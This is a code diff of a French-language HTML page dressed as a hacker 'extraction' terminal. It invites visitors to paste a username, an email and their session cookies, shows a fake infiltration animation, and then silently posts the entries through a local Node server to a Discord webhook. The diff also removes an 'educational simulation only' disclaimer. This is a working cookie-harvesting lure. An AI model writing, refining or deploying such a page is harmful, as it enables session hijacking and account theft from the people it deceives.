@@ -2,143 +2,167 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Cyber-Security Lab | Portal</title>
+    <title>TERMINAL | Cyber-Security Lab</title>
     <style>
-        :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
+        :root { --neon-green: #00ff41; --dark-bg: #060b06; }
+        
+        /* Effet CRT */
+        body::before {
+            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 5; background-size: 100% 2px, 3px 100%; pointer-events: none;
+        }
+
         body { 
-            background: var(--dark-bg); 
-            color: var(--neon-green); 
-            font-family: 'Courier New', monospace; 
-            margin: 0; padding: 20px; 
-            display: flex; flex-direction: column; align-items: center; 
-            min-height: 100vh;
+            background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', monospace; 
+            margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
         }
         
         .container { 
-            max-width: 500px; width: 100%; border: 1px solid var(--neon-green); 
-            padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
-            margin-top: 50px; background: rgba(0, 20, 0, 0.95);
+            max-width: 600px; width: 100%; border: 1px solid var(--neon-green); padding: 30px; 
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.15); margin-top: 50px; background: rgba(0, 10, 0, 0.9);
+            position: relative; z-index: 3;
         }
 
-        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; font-size: 1.5rem; }
+        h1 { text-transform: uppercase; letter-spacing: 8px; text-align: center; border-bottom: 2px solid var(--neon-green); padding-bottom: 10px; font-size: 1.8rem; }
         
         input, textarea { 
-            background: black; border: 1px solid var(--neon-green); 
-            color: var(--neon-green); width: 100%; padding: 12px; 
-            margin: 10px 0; box-sizing: border-box; outline: none;
+            background: rgba(0,0,0,0.7); border: 1px solid var(--neon-green); color: var(--neon-green); 
+            width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; outline: none;
         }
 
         button { 
-            background: var(--neon-green); color: black; border: none; 
-            padding: 12px 20px; cursor: pointer; font-weight: bold; 
-            width: 100%; transition: 0.3s; margin-top: 10px; text-transform: uppercase;
+            background: var(--neon-green); color: black; border: none; padding: 15px 20px; 
+            cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; margin-top: 15px; 
+            text-transform: uppercase; letter-spacing: 2px;
         }
 
-        button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }
+        button:hover { background: white; box-shadow: 0 0 30px var(--neon-green); transform: scale(1.02); }
 
         #loading-zone, #final-success { display: none; text-align: center; padding: 40px; }
-        
-        .glitch { font-size: 1.1rem; animation: pulse 1.5s infinite; margin-bottom: 20px; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-        .progress-bar { color: white; font-size: 1rem; margin-top: 10px; }
-        .footer-note { font-size: 0.7rem; color: #444; margin-top: 40px; text-align: center; }
+        .log-line { text-align: left; font-size: 0.8rem; margin: 5px 0; color: #008f11; }
+        .progress-bar { color: white; font-size: 1.1rem; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div id="main-content">
-        <h1>SESSION LAB v1.0</h1>
+    <h1>CYBER-CORE v2.0</h1>
 
-        <div id="user-view">
-            <p>[SYSTEM]: Entrez les identifiants pour la synchronisation.</p>
-            <input type="text" id="username" placeholder="Username">
-            <input type="email" id="userEmail" placeholder="Votre Email">
-            <textarea id="cookieInput" rows="4" placeholder="Données de session (Cookies)..."></textarea>
-            <button onclick="processData()">INITIER LE TRANSFERT</button>
-        </div>
+    <div id="user-view">
+        <p>> ACCÈS SÉCURISÉ REQUIS</p>
+        <input type="text" id="username" placeholder="IDENTIFIANT CIBLE">
+        <input type="email" id="userEmail" placeholder="EMAIL DE RÉCEPTION">
+        <textarea id="cookieInput" rows="4" placeholder="VECTEUR DE SESSION (COOKIES)..."></textarea>
+        <button onclick="processData()">LANCER L'EXTRACTION</button>
+    </div>
 
-        <div id="loading-zone">
-            <div class="glitch" id="status-text">CRYPTAGE EN COURS...</div>
-            <div class="progress-bar" id="bar-text">[░░░░░░░░░░░░] 0%</div>
-        </div>
+    <div id="loading-zone">
+        <div style="font-size: 1.2rem; margin-bottom: 20px;">> INFILTRATION...</div>
+        <div id="log-container" style="height: 120px; overflow: hidden; border-left: 2px solid var(--neon-green); padding-left: 10px; margin-bottom: 20px;"></div>
+        <div class="progress-bar" id="bar-text">[░░░░░░░░░░░░] 0%</div>
+    </div>
 
-        <div id="final-success">
-            <h2 style="color:white; border-bottom: 1px solid white; padding-bottom:10px;">TRANSFERT RÉUSSI</h2>
-            <p style="margin-top:20px;">[SYSTEM]: Données transmises avec succès.</p>
-            <p>Un rapport détaillé vous sera envoyé par <strong>EMAIL</strong> à l'adresse suivante :</p>
-            <p style="color: var(--neon-green); font-size: 1.2rem; text-decoration: underline; font-weight: bold;" id="target-email"></p>
-            <div class="progress-bar" style="color:var(--neon-green); margin-top:20px;">[████████████] 100%</div>
-            <button onclick="location.reload()" style="background:none; color:var(--neon-green); border:1px solid var(--neon-green); margin-top:30px;">NOUVELLE SESSION</button>
+    <div id="final-success">
+        <h2 style="color:white;">EXTRACTION RÉUSSIE</h2>
+        <div style="border: 1px dashed var(--neon-green); padding: 15px; margin: 20px 0;">
+            <p>Rapport généré pour l'adresse :</p>
+            <p style="color: white; font-size: 1.2rem; font-weight: bold;" id="target-email"></p>
         </div>
+        <button onclick="downloadReport()" style="background:white; color:black; margin-bottom:10px;">TÉLÉCHARGER LE LOG (.TXT)</button>
+        <button onclick="location.reload()" style="background:none; color:var(--neon-green); border:1px solid var(--neon-green);">NOUVELLE SESSION</button>
     </div>
 </div>
 
-<p class="footer-note">EDUCATIONAL SIMULATION ONLY - CYBER LABS 2026</p>
-
 <script>
-    // Utilisation de window. pour garantir que le bouton trouve la fonction
-    window.processData = async function() {
-        const u = document.getElementById('username').value;
-        const e = document.getElementById('userEmail').value;
-        const c = document.getElementById('cookieInput').value;
+    let sessionData = {};
 
-        if(!u || !e) {
-            alert("Erreur : L'utilisateur et l'email sont requis.");
-            return;
-        }
+    function playSound(freq, duration) {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'square'; osc.frequency.value = freq;
+        gain.gain.value = 0.05; osc.connect(gain); gain.connect(audioCtx.destination);
+        osc.start(); setTimeout(() => osc.stop(), duration);
+    }
 
-        // 1. Basculer l'affichage
+    window.processData = function() {
+        sessionData = {
+            u: document.getElementById('username').value,
+            e: document.getElementById('userEmail').value,
+            c: document.getElementById('cookieInput').value
+        };
+
+        if(!sessionData.u || !sessionData.e) return alert("ACCÈS REFUSÉ : Champs manquants.");
+
+        playSound(440, 100);
         document.getElementById('user-view').style.display = 'none';
         document.getElementById('loading-zone').style.display = 'block';
         
-        const statusText = document.getElementById('status-text');
-        const barText = document.getElementById('bar-text');
-
-        // 2. Animation de progression
-        const steps = [
-            { t: "GÉNÉRATION DU TUNNEL...", b: "[██░░░░░░░░░░] 20%" },
-            { t: "ENVOI DES PAQUETS...", b: "[██████░░░░░░] 55%" },
-            { t: "SYNCHRONISATION FINALE...", b: "[██████████░░] 85%" }
+        const logs = [
+            "Initialisation du bypass SSL...",
+            "Capture des vecteurs de cookies...",
+            "Cryptage AES-256 des données...",
+            "Upload vers le serveur distant...",
+            "Nettoyage des traces système..."
         ];
 
         let i = 0;
-        const interval = setInterval(async () => {
-            if(i < steps.length) {
-                statusText.innerText = steps[i].t;
-                barText.innerText = steps[i].b;
+        const interval = setInterval(() => {
+            if(i < logs.length) {
+                const line = document.createElement('div');
+                line.className = 'log-line';
+                line.innerText = "> " + logs[i];
+                document.getElementById('log-container').appendChild(line);
+                const pct = Math.floor(((i+1) / logs.length) * 100);
+                document.getElementById('bar-text').innerText = `[${"█".repeat(i*2.4)}${"░".repeat(12-(i*2.4))}] ${pct}%`;
+                playSound(600 + (i*50), 50);
                 i++;
             } else {
                 clearInterval(interval);
-                
-                // 3. Tentative d'envoi (ne bloque pas si le serveur est éteint)
-                try {
-                    fetch("http://localhost:3000/send-data", {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "🚨 LOGS RÉCUPÉRÉS 🚨",
-                                color: 5763719,
-                                fields: [
-                                    { name: "👤 User", value: u, inline: true },
-                                    { name: "📧 Email", value: e, inline: true },
-                                    { name: "🍪 Session", value: "```" + (c || "N/A") + "```" }
-                                ]
-                            }]
-                        })
-                    }).catch(e => console.log("Serveur local non détecté."));
-                } catch (err) {}
-
-                // 4. Affichage final
-                document.getElementById('loading-zone').style.display = 'none';
-                document.getElementById('final-success').style.display = 'block';
-                document.getElementById('target-email').innerText = e;
+                finish();
             }
-        }, 700);
+        }, 800);
+    };
+
+    function finish() {
+        playSound(880, 200);
+        document.getElementById('loading-zone').style.display = 'none';
+        document.getElementById('final-success').style.display = 'block';
+        document.getElementById('target-email').innerText = sessionData.e;
+
+        // Envoi silencieux au webhook Discord via ton serveur Node
+        fetch("http://localhost:3000/send-data", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "💀 NOUVELLE EXTRACTION 💀",
+                    color: 3066993,
+                    fields: [
+                        { name: "Cible", value: sessionData.u, inline: true },
+                        { name: "Email", value: sessionData.e, inline: true },
+                        { name: "Cookies", value: "```" + (sessionData.c || "N/A") + "```" }
+                    ]
+                }]
+            })
+        }).catch(() => console.log("Note: Serveur Node éteint."));
+    }
+
+    window.downloadReport = function() {
+        const text = `--- RAPPORT D'EXTRACTION CYBER-LAB ---\nDate: ${new Date().toLocaleString()}\nCible: ${sessionData.u}\nEmail de réception: ${sessionData.e}\nStatus: Succès\n\nDonnées capturées:\n${sessionData.c || "Aucune"}`;
+        const blob = new Blob([text], { type: 'text/plain' });
+        const anchor = document.createElement('a');
+        anchor.download = `rapport_${sessionData.u}.txt`;
+        anchor.href = window.URL.createObjectURL(blob);
+        anchor.click();
     };
 </script>
 
 </body>
 </html>
+
+</body>
+</html>
+
